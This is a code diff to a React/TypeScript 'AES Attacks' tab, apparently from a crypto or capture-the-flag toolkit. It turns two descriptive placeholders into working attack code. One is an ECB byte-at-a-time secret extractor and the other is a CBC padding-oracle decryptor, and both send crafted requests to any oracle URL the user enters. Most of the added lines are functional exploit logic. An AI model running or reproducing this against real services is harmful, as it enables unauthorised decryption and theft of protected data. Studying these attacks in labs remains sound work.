@@ -264,10 +264,14 @@ function AESAttacksTab() {
   const [gcmPt1, setGcmPt1] = useState('');
   const [gcmCt2, setGcmCt2] = useState('');
   const [scheduleKey, setScheduleKey] = useState('');
+  const [ecbBlockSize, setEcbBlockSize] = useState('16');
+  const [cbcCiphertext, setCbcCiphertext] = useState('');
+  const [cbcIv, setCbcIv] = useState('');
+  const [running, setRunning] = useState(false);
 
   const copy = useCallback(() => { if (result) navigator.clipboard.writeText(result).catch(() => {}); }, [result]);
 
-  const run = useCallback(() => {
+  const run = useCallback(async () => {
     setError(null); setResult(null);
     setCtxOutput(null); setCtxError(null);
     try {
@@ -337,19 +341,175 @@ function AESAttacksTab() {
           break;
         }
         case 'ecb-byte': {
-          const resultE = `ECB Byte-at-a-Time Attack\n\nOracle: ${oracleUrl || '(not set)'}\n\n1. Feed 'A'*1..'A'*32 to find block size (output length jump)\n2. Send 48 'A's → repeating blocks → ECB confirmed\n3. For byte position p: send 'A'*(15-p%16), brute-force last byte\n\nRequires live oracle endpoint. This is the algorithmic reference.`;
-          setResult(resultE);
-          setCtxOutput(resultE);
+          const url = oracleUrl.trim();
+          if (!url) throw new Error('Oracle URL is required');
+          const bs = parseInt(ecbBlockSize, 10) || 16;
+          setRunning(true);
+
+          const linesE: string[] = [];
+          const updE = (text: string) => { linesE.push(text); setResult(linesE.join('\n')); setCtxOutput(linesE.join('\n')); };
+
+          async function oracleECB(pt: string): Promise<Uint8Array> {
+            const resp = await fetch(url, {
+              method: 'POST', headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ plaintext: pt }),
+            });
+            if (!resp.ok) throw new Error(`Oracle HTTP ${resp.status} ${resp.statusText}`);
+            const d = (await resp.json()) as Record<string, unknown>;
+            if (typeof d.ciphertext !== 'string') throw new Error('Oracle response missing ciphertext field');
+            return hexToBytes(d.ciphertext.replace(/\s/g, ''));
+          }
+
+          updE('=== Step 1: Determining block size ===');
+          let bsize = bs;
+          let prevLen = 0;
+          for (let i = 1; i <= 48; i++) {
+            const ct = await oracleECB('A'.repeat(i));
+            if (prevLen > 0 && ct.length > prevLen) {
+              bsize = ct.length - prevLen;
+              updE(`Block size = ${bsize} (input ${i}B → ${prevLen}→${ct.length}B)`);
+              break;
+            }
+            prevLen = ct.length;
+            if (i === 48) updE(`No boundary found up to 48 bytes, using default ${bsize}`);
+          }
+
+          updE('\n=== Step 2: Confirming ECB mode ===');
+          const ecbCt = await oracleECB('A'.repeat(bsize * 3));
+          const eb0 = bytesToHex(ecbCt.subarray(0, bsize));
+          const eb1 = bytesToHex(ecbCt.subarray(bsize, bsize * 2));
+          if (eb0 === eb1) updE('ECB confirmed — first two blocks of 48 A-bytes match');
+          else updE('WARNING: no repeating blocks — cipher may not be in ECB mode');
+
+          updE('\n=== Step 3: Extracting secret ===');
+          const base = await oracleECB('');
+          const totalLen = base.length;
+          updE(`Oracle ciphertext with empty input: ${totalLen} bytes`);
+          if (totalLen === 0) throw new Error('Oracle returned empty ciphertext — no secret to recover');
+
+          const recovered: number[] = [];
+          for (let pos = 0; pos < totalLen; pos++) {
+            const bi = Math.floor(pos / bsize);
+            const padLen = bsize - 1 - (pos % bsize);
+            const pad = 'A'.repeat(padLen);
+            const target = bytesToHex((await oracleECB(pad)).subarray(bi * bsize, (bi + 1) * bsize));
+            let found = false;
+            for (let g = 0; g < 256; g++) {
+              const inp = pad + recovered.map(b => String.fromCharCode(b)).join('') + String.fromCharCode(g);
+              const testCt = await oracleECB(inp);
+              if (bytesToHex(testCt.subarray(0, bsize)) === target) {
+                recovered.push(g);
+                found = true;
+                break;
+              }
+            }
+            if (!found) { updE(`[WARN] Failed to recover byte at position ${pos}`); break; }
+            if (pos % bsize === bsize - 1) updE(`  Block ${bi + 1} complete (${recovered.length}/${totalLen} bytes)`);
+          }
+
+          const recHex = recovered.map(b => b.toString(16).padStart(2, '0')).join('');
+          let recText = '';
+          try { recText = new TextDecoder().decode(new Uint8Array(recovered)); } catch { recText = '(non-UTF8)'; }
+          updE(`\n=== Result ===\nRecovered (hex): ${recHex}\nRecovered (text): ${recText}`);
+          const finalE = linesE.join('\n') + '\n\nMETHOD=TYPESCRIPT\n=SUCCESS';
+          setResult(finalE);
+          setCtxOutput(finalE);
           setOutputSource('calculator');
-          addToHistory('calculator-aes', `AES Attack: ${attack}`, resultE, true);
+          addToHistory('calculator-aes', 'AES Attack: ECB Byte-at-a-Time', finalE, true);
+          setRunning(false);
           break;
         }
         case 'cbc-padding': {
-          const resultF = `CBC Padding Oracle Attack\n\nOracle: ${oracleUrl || '(not set)'}\n\nFor each pair (C[i-1], C[i]):\n  For byte p = 15..0:\n    For guess g = 0..255:\n      C'[i-1][p] = C[i-1][p] ^ g ^ (16-p)\n      Submit (C'[i-1] || C[i]) → oracle\n      If 'valid padding' → P[i][p] = C[i-1][p] ^ g ^ (16-p)\n\nCS'16 padding oracle: Pr[valid padding] ≈ 1/256 × (257 - #bad padding)`;
-          setResult(resultF);
-          setCtxOutput(resultF);
+          const pUrl = oracleUrl.trim();
+          if (!pUrl) throw new Error('Oracle URL is required');
+          const ctHex = cbcCiphertext.replace(/\s/g, '');
+          if (!ctHex) throw new Error('Ciphertext (hex) is required');
+          const ct = hexToBytes(ctHex);
+          if (ct.length % 16 !== 0) throw new Error(`Ciphertext length (${ct.length}) is not a multiple of 16`);
+          const ivBytes = cbcIv.replace(/\s/g, '');
+          const iv = ivBytes ? hexToBytes(ivBytes) : new Uint8Array(16);
+          if (iv.length !== 16) throw new Error('IV must be 16 bytes (32 hex chars)');
+          setRunning(true);
+
+          const linesP: string[] = [];
+          const updP = (text: string) => { linesP.push(text); setResult(linesP.join('\n')); setCtxOutput(linesP.join('\n')); };
+
+          const blocks: Uint8Array[] = [iv];
+          for (let i = 0; i < ct.length; i += 16) blocks.push(ct.subarray(i, i + 16));
+
+          async function oraclePad(check: string): Promise<boolean> {
+            const resp = await fetch(pUrl, {
+              method: 'POST', headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ ciphertext: check }),
+            });
+            if (!resp.ok) throw new Error(`Oracle HTTP ${resp.status} ${resp.statusText}`);
+            const d = (await resp.json()) as Record<string, unknown>;
+            return d.valid === true || d.success === true;
+          }
+
+          const plainBlocks: Uint8Array[] = [];
+
+          for (let bi = 1; bi < blocks.length; bi++) {
+            const prev = blocks[bi - 1];
+            const curr = blocks[bi];
+            const inter = new Uint8Array(16);
+            updP(`\n--- Decrypting block ${bi}/${blocks.length - 1} ---`);
+
+            for (let p = 15; p >= 0; p--) {
+              const padVal = 16 - p;
+              let found = false;
+              for (let g = 0; g < 256; g++) {
+                const mod = new Uint8Array(16);
+                for (let j = 0; j < 16; j++) {
+                  if (j < p) mod[j] = Math.floor(Math.random() * 256);
+                  else if (j === p) mod[j] = prev[j] ^ g ^ padVal;
+                  else mod[j] = prev[j] ^ inter[j] ^ padVal;
+                }
+                const test = bytesToHex(new Uint8Array([...mod, ...curr]));
+                const ok = await oraclePad(test);
+                if (ok) {
+                  inter[p] = prev[p] ^ g ^ padVal;
+                  found = true;
+                  if (p < 15) {
+                    const vfy = new Uint8Array(16);
+                    for (let j = 0; j < 16; j++) {
+                      if (j < 14) vfy[j] = 0;
+                      else if (j === 14) vfy[j] = prev[14] ^ inter[14] ^ 2;
+                      else vfy[j] = prev[15] ^ inter[15] ^ 2;
+                    }
+                    const vfyHex = bytesToHex(new Uint8Array([...vfy, ...curr]));
+                    if (!(await oraclePad(vfyHex))) {
+                      found = false;
+                      continue;
+                    }
+                  }
+                  updP(`  Byte ${p}: 0x${g.toString(16).padStart(2, '0')} → inter[${p}]=0x${inter[p].toString(16).padStart(2, '0')}`);
+                  break;
+                }
+              }
+              if (!found) throw new Error(`Failed at byte ${p} in block ${bi}`);
+            }
+
+            const blockPt = xorBytes(prev, inter);
+            plainBlocks.push(blockPt);
+            updP(`  → PT block ${bi}: ${bytesToHex(blockPt)}`);
+          }
+
+          const total = plainBlocks.reduce((a, b) => a + b.length, 0);
+          const full = new Uint8Array(total);
+          let off = 0;
+          for (const b of plainBlocks) { full.set(b, off); off += b.length; }
+          const pad = full[full.length - 1];
+          const stripped = (pad >= 1 && pad <= 16 && full.length >= pad) ? full.subarray(0, full.length - pad) : full;
+          let ptText = '';
+          try { ptText = new TextDecoder().decode(stripped); } catch { ptText = '(non-UTF8)'; }
+          updP(`\n=== Result ===\nPlaintext (hex): ${bytesToHex(stripped)}\nPlaintext (text): ${ptText}`);
+          const finalP = linesP.join('\n') + '\n\nMETHOD=TYPESCRIPT\n=SUCCESS';
+          setResult(finalP);
+          setCtxOutput(finalP);
           setOutputSource('calculator');
-          addToHistory('calculator-aes', `AES Attack: ${attack}`, resultF, true);
+          addToHistory('calculator-aes', 'AES Attack: CBC Padding Oracle', finalP, true);
+          setRunning(false);
           break;
         }
         case 'gcm-nonce': {
@@ -389,8 +549,9 @@ function AESAttacksTab() {
       setError(errMsg);
       setCtxError(errMsg);
       setOutputSource('calculator');
+      setRunning(false);
     }
-  }, [attack, ct1, ct2, knownPt, ivHex, blockIdx, targetText, currentPtHex, cts, oracleUrl, gcmCt1, gcmPt1, gcmCt2, scheduleKey, addToHistory, setCtxError, setCtxOutput, setOutputSource]);
+  }, [attack, ct1, ct2, knownPt, ivHex, blockIdx, targetText, currentPtHex, cts, oracleUrl, gcmCt1, gcmPt1, gcmCt2, scheduleKey, ecbBlockSize, cbcCiphertext, cbcIv, setRunning, addToHistory, setCtxError, setCtxOutput, setOutputSource]);
 
   const attackFields = useMemo(() => {
     switch (attack) {
@@ -413,10 +574,13 @@ function AESAttacksTab() {
         <TextField fullWidth label="Ciphertext (hex)" value={ct1} onChange={e => setCt1(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="Multiples of 16 bytes" spellCheck={false} />
       );
       case 'ecb-byte': return (
-        <TextField fullWidth label="Oracle URL" value={oracleUrl} onChange={e => setOracleUrl(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="http://localhost:8000/encrypt?data=" />
+        <><TextField fullWidth label="Oracle URL" value={oracleUrl} onChange={e => setOracleUrl(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="http://localhost:8000/encrypt" spellCheck={false} helperText="POST {plaintext:string} → {ciphertext:hex}" />
+        <TextField fullWidth label="Block Size" value={ecbBlockSize} onChange={e => setEcbBlockSize(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="16" helperText="Default 16 — auto-detected if wrong" /></>
       );
       case 'cbc-padding': return (
-        <TextField fullWidth label="Oracle URL" value={oracleUrl} onChange={e => setOracleUrl(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="http://localhost:8000/decrypt?ct=" />
+        <><TextField fullWidth label="Oracle URL" value={oracleUrl} onChange={e => setOracleUrl(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="http://localhost:8000/padding-oracle" spellCheck={false} helperText="POST {ciphertext:hex} → {valid:boolean}" />
+        <TextField fullWidth label="Ciphertext (hex)" value={cbcCiphertext} onChange={e => setCbcCiphertext(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="Full ciphertext in hex" spellCheck={false} />
+        <TextField fullWidth label="IV (hex, optional)" value={cbcIv} onChange={e => setCbcIv(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="32 hex chars" spellCheck={false} helperText="Defaults to zeros if omitted" /></>
       );
       case 'gcm-nonce': return (
         <><TextField fullWidth label="CT1" value={gcmCt1} onChange={e => setGcmCt1(e.target.value)} variant="outlined" sx={{ ...inputSx, mb: 2 }} placeholder="CT1 hex" spellCheck={false} />
@@ -428,7 +592,7 @@ function AESAttacksTab() {
       );
       default: return null;
     }
-  }, [attack, ct1, ct2, knownPt, ivHex, blockIdx, targetText, currentPtHex, cts, oracleUrl, gcmCt1, gcmPt1, gcmCt2, scheduleKey]);
+  }, [attack, ct1, ct2, knownPt, ivHex, blockIdx, targetText, currentPtHex, cts, oracleUrl, gcmCt1, gcmPt1, gcmCt2, scheduleKey, ecbBlockSize, cbcCiphertext, cbcIv]);
 
   return (
     <Box>
@@ -439,7 +603,7 @@ function AESAttacksTab() {
         </Select>
       </FormControl>
       {attackFields}
-      <Button variant="contained" startIcon={<PlayArrow />} onClick={run} fullWidth
+      <Button variant="contained" startIcon={<PlayArrow />} onClick={() => { void run(); }} disabled={running} fullWidth
         sx={{ backgroundColor: draculaColors.purple, fontFamily: "'JetBrains Mono', monospace", mb: 2, '&:hover': { backgroundColor: '#a575f6' } }}>
         Run Attack
       </Button>
